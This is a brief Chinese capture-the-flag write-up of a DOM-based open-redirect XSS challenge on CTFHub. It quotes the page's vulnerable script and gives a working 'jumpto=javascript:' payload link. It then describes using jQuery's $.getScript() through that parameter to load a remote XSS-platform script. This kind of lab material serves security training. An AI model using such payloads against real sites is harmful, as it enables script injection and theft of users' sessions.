## DOM 跳转 XSS

进入网站直接看源代码

```js
<script>
    	// location.search：获取 URL 中 ? 后面的部分
    	// .split("=")：将字符串按照等号 = 分割成数组
    	// 如果 location.search 为 "?jumpto=https://www.baidu.com"，target 会是：
    	// ["?jumpto", "https://www.baidu.com"]
        var target = location.search.split("=")

		// target[0] 是 "?jumpto"
		// .slice(1) 移除第一个字符 ?，变成 "jumpto"
		// 如果等于 "jumpto"，就进入 if 块
        if (target[0].slice(1) == "jumpto") {
            // 将浏览器重定向到 target[1]，也就是 https://www.baidu.com
            location.href = target[1];
        }
</script>
```

注意！当你将类似于  l`ocation.href = "javascript:alert('xss')"`  这样的代码赋值给  `location.href`  时

浏览器会将其解释为一种特殊的 URL 方案，即 `"javascript:"`

在这种情况下，浏览器会将后面的 JavaScript 代码作为 URL 的一部分进行解析，然后执行它

所以我们可以构造如下链接：执行 JS 语句

```
http://challenge-f42fd52528263d24.sandbox.ctfhub.com:10800/?jumpto=javascript:alert(1)
```

![](https://pic1.imgdb.cn/item/687c722358cb8da5c8c82382.png)

用 `jQuery`  的  `$.getScript()`  函数来异步加载并执行平台的 JS 脚本，通过 `jumpto=javascript:$.getScript()`

![](https://pic1.imgdb.cn/item/687c7e9258cb8da5c8c83e5d.png)

